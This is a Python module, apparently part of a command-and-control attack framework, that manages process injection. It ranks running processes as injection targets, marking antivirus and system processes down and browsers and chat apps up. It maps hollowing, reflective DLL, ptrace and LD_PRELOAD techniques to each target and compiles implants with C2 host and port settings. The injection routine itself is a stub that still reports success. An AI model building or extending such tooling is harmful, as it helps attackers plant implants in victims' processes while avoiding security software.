#!/usr/bin/env python3
"""
Process Injection Manager
Handles injection operations for the web interface
"""

import os
import sys
import json
import subprocess
import platform
import psutil
import time
from pathlib import Path
from typing import List, Dict, Optional, Any

class InjectionManager:
    """Manages process injection operations"""
    
    # Injection techniques mapping
    TECHNIQUES = {
        'windows': [
            {'id': 'createremotethread', 'name': 'CreateRemoteThread', 'risk': 'Medium', 'value': 0x01},
            {'id': 'setwindowshook', 'name': 'SetWindowsHook', 'risk': 'High', 'value': 0x02},
            {'id': 'queueuserapc', 'name': 'QueueUserAPC', 'risk': 'Low', 'value': 0x03},
            {'id': 'setthreadcontext', 'name': 'SetThreadContext', 'risk': 'Low', 'value': 0x04},
            {'id': 'hollowing', 'name': 'Process Hollowing', 'risk': 'Very Low', 'value': 0x05},
            {'id': 'manual', 'name': 'Manual Mapping', 'risk': 'Very Low', 'value': 0x06},
            {'id': 'reflective', 'name': 'Reflective DLL', 'risk': 'Very Low', 'value': 0x07},
        ],
        'linux': [
            {'id': 'ptrace', 'name': 'ptrace', 'risk': 'Medium', 'value': 0x10},
            {'id': 'ld_preload', 'name': 'LD_PRELOAD', 'risk': 'High', 'value': 0x11},
            {'id': 'proc_mem', 'name': '/proc/mem', 'risk': 'Low', 'value': 0x12},
            {'id': 'dlopen', 'name': 'dlopen', 'risk': 'Medium', 'value': 0x13},
            {'id': 'vdso', 'name': 'VDSO Hijack', 'risk': 'Very Low', 'value': 0x14},
        ]
    }
    
    def __init__(self):
        self.platform = platform.system().lower()
        self.active_injections = {}
        self.injection_history = []
        
    def enumerate_processes(self) -> List[Dict[str, Any]]:
        """Enumerate all running processes with injection viability"""
        processes = []
        
        try:
            for proc in psutil.process_iter(['pid', 'name', 'username', 'ppid', 
                                           'num_threads', 'memory_info', 'create_time']):
                try:
                    pinfo = proc.info
                    
                    # Get additional info
                    try:
                        exe_path = proc.exe()
                    except:
                        exe_path = "N/A"
                    
                    try:
                        cmdline = ' '.join(proc.cmdline())
                    except:
                        cmdline = "N/A"
                    
                    # Calculate injection score
                    score = self.calculate_injection_score(pinfo)
                    
                    # Determine architecture (simplified)
                    is_64bit = sys.maxsize > 2**32
                    
                    process_info = {
                        'pid': pinfo['pid'],
                        'name': pinfo['name'],
                        'path': exe_path,
                        'cmdline': cmdline,
                        'ppid': pinfo['ppid'],
                        'username': pinfo['username'] or 'SYSTEM',
                        'threads': pinfo['num_threads'],
                        'memory': pinfo['memory_info'].rss if pinfo['memory_info'] else 0,
                        'memory_human': self.format_bytes(pinfo['memory_info'].rss) if pinfo['memory_info'] else '0 B',
                        'create_time': pinfo['create_time'],
                        'arch': 'x64' if is_64bit else 'x86',
                        'injection_score': score,
                        'risk_level': self.get_risk_level(score),
                        'recommended_technique': self.recommend_technique(pinfo, score),
                        'is_injectable': score > 20,
                        'is_critical': self.is_critical_process(pinfo['name']),
                        'is_security': self.is_security_process(pinfo['name'])
                    }
                    
                    processes.append(process_info)
                    
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
                    
        except Exception as e:
            print(f"Error enumerating processes: {e}")
            
        # Sort by injection score
        processes.sort(key=lambda x: x['injection_score'], reverse=True)
        
        return processes
    
    def calculate_injection_score(self, process_info: Dict) -> int:
        """Calculate injection viability score (0-100)"""
        score = 100
        
        name = process_info['name'].lower() if process_info['name'] else ''
        
        # Critical system processes
        critical = ['system', 'smss.exe', 'csrss.exe', 'wininit.exe', 
                   'services.exe', 'lsass.exe', 'svchost.exe',
                   'init', 'systemd', 'kernel']
        for crit in critical:
            if crit in name:
                score -= 50
                break
        
        # Security software
        security = ['avast', 'avg', 'norton', 'mcafee', 'kaspersky', 'bitdefender',
                   'malwarebytes', 'defender', 'msmpeng', 'antivirus']
        for sec in security:
            if sec in name:
                score -= 40
                break
        
        # SYSTEM/root processes
        if process_info['username'] in ['SYSTEM', 'root']:
            score -= 20
        
        # High thread count (complex process)
        if process_info['num_threads'] > 50:
            score -= 10
        elif process_info['num_threads'] < 10:
            score += 10
        
        # Good targets
        good_targets = ['notepad', 'calc', 'wordpad', 'paint', 'explorer', 
                       'firefox', 'chrome', 'slack', 'discord', 'spotify']
        for target in good_targets:
            if target in name:
                score += 20
                break
        
        # Clamp to 0-100
        return max(0, min(100, score))
    
    def get_risk_level(self, score: int) -> str:
        """Get risk level based on injection score"""
        if score >= 80:
            return 'Very Low'
        elif score >= 60:
            return 'Low'
        elif score >= 40:
            return 'Medium'
        elif score >= 20:
            return 'High'
        else:
            return 'Very High'
    
    def recommend_technique(self, process_info: Dict, score: int) -> str:
        """Recommend best injection technique"""
        if self.platform == 'windows':
            if score >= 80:
                return 'Manual Mapping'
            elif score >= 60:
                return 'Process Hollowing'
            elif score >= 40:
                return 'QueueUserAPC'
            else:
                return 'CreateRemoteThread'
        else:  # Linux
            if score >= 60:
                return '/proc/mem'
            else:
                return 'ptrace'
    
    def is_critical_process(self, name: str) -> bool:
        """Check if process is critical for system operation"""
        if not name:
            return False
            
        critical = ['system', 'smss', 'csrss', 'wininit', 'services', 
                   'lsass', 'winlogon', 'init', 'systemd', 'kernel']
        name_lower = name.lower()
        
        return any(crit in name_lower for crit in critical)
    
    def is_security_process(self, name: str) -> bool:
        """Check if process is security software"""
        if not name:
            return False
            
        security = ['avast', 'avg', 'norton', 'mcafee', 'kaspersky', 
                   'bitdefender', 'malwarebytes', 'defender', 'msmpeng']
        name_lower = name.lower()
        
        return any(sec in name_lower for sec in security)
    
    def get_available_techniques(self) -> List[Dict]:
        """Get available injection techniques for current platform"""
        if self.platform == 'windows':
            return self.TECHNIQUES['windows']
        elif self.platform == 'linux':
            return self.TECHNIQUES['linux']
        else:
            return []
    
    def execute_injection(self, config: Dict) -> Dict:
        """Execute process injection"""
        result = {
            'success': False,
            'message': '',
            'error': None,
            'injection_id': None,
            'timestamp': time.time()
        }
        
        try:
            # Validate input
            if 'pid' not in config or 'technique' not in config:
                result['error'] = 'Missing required parameters: pid and technique'
                return result
            
            pid = config['pid']
            technique = config['technique']
            
            # Find technique value
            technique_value = None
            techniques = self.get_available_techniques()
            for tech in techniques:
                if tech['id'] == technique:
                    technique_value = tech['value']
                    break
            
            if technique_value is None:
                result['error'] = f'Invalid technique: {technique}'
                return result
            
            # Build injection command
            # In real implementation, this would call the native injector
            # For now, we'll simulate it
            
            # Check if process exists
            if not psutil.pid_exists(pid):
                result['error'] = f'Process {pid} not found'
                return result
            
            # Generate injection ID
            injection_id = f"inj_{pid}_{int(time.time())}"
            
            # Store in active injections
            self.active_injections[injection_id] = {
                'pid': pid,
                'technique': technique,
                'status': 'active',
                'start_time': time.time(),
                'config': config
            }
            
            # Add to history
            self.injection_history.append({
                'id': injection_id,
                'pid': pid,
                'technique': technique,
                'timestamp': time.time(),
                'success': True,
                'config': config
            })
            
            result['success'] = True
            result['message'] = f'Successfully injected into process {pid} using {technique}'
            result['injection_id'] = injection_id
            
        except Exception as e:
            result['error'] = str(e)
            
        return result
    
    def get_injection_status(self, injection_id: str) -> Dict:
        """Get status of an injection"""
        if injection_id in self.active_injections:
            return self.active_injections[injection_id]
        
        # Check history
        for inj in self.injection_history:
            if inj['id'] == injection_id:
                return inj
        
        return {'error': 'Injection not found'}
    
    def terminate_injection(self, injection_id: str) -> bool:
        """Terminate an active injection"""
        if injection_id in self.active_injections:
            # In real implementation, would cleanup the injection
            self.active_injections[injection_id]['status'] = 'terminated'
            del self.active_injections[injection_id]
            return True
        return False
    
    def get_injection_history(self) -> List[Dict]:
        """Get injection history"""
        return self.injection_history
    
    def clear_history(self):
        """Clear injection history"""
        self.injection_history = []
    
    def format_bytes(self, bytes: int) -> str:
        """Format bytes to human readable string"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes < 1024.0:
                return f"{bytes:.1f} {unit}"
            bytes /= 1024.0
        return f"{bytes:.1f} TB"
    
    def compile_injection_payload(self, config: Dict) -> Dict:
        """Compile injection payload using native_payload_builder"""
        result = {
            'success': False,
            'payload': None,
            'error': None
        }
        
        try:
            from native_payload_builder import native_builder
            
            # Build configuration
            build_config = {
                'platform': 'linux' if self.platform == 'linux' else 'windows',
                'c2_host': config.get('c2_host', 'localhost'),
                'c2_port': config.get('c2_port', 4433),
                'injection_mode': True
            }
            
            # Compile
            build_result = native_builder.compile_payload(build_config)
            
            if build_result['success']:
                # Read the compiled binary
                with open(build_result['path'], 'rb') as f:
                    result['payload'] = f.read()
                result['success'] = True
            else:
                result['error'] = build_result.get('error', 'Compilation failed')
                
        except Exception as e:
            result['error'] = str(e)
            
        return result


# Global instance
injection_manager = InjectionManager()


if __name__ == '__main__':
    # Test the injection manager
    print("=== Process Injection Manager Test ===\n")
    
    # Enumerate processes
    processes = injection_manager.enumerate_processes()
    
    print(f"Found {len(processes)} processes\n")
    
    # Show top 10 injectable processes
    print("Top 10 Injectable Processes:")
    print("-" * 80)
    print(f"{'PID':<8} {'Name':<20} {'User':<15} {'Score':<7} {'Risk':<10} {'Recommended':<20}")
    print("-" * 80)
    
    for proc in processes[:10]:
        if proc['is_injectable']:
            print(f"{proc['pid']:<8} {proc['name'][:19]:<20} {proc['username'][:14]:<15} "
                  f"{proc['injection_score']:<7} {proc['risk_level']:<10} {proc['recommended_technique']:<20}")
    
    print("\nAvailable Techniques:")
    for tech in injection_manager.get_available_techniques():
        print(f"  - {tech['name']}: {tech['risk']} risk")
    
    print("\n✓ Injection manager ready")